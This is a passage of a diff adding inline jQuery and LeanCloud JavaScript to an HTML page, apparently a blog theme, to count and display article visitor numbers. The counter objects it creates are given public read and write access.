+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.article-title').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+  </div>
+</body>
+</html>
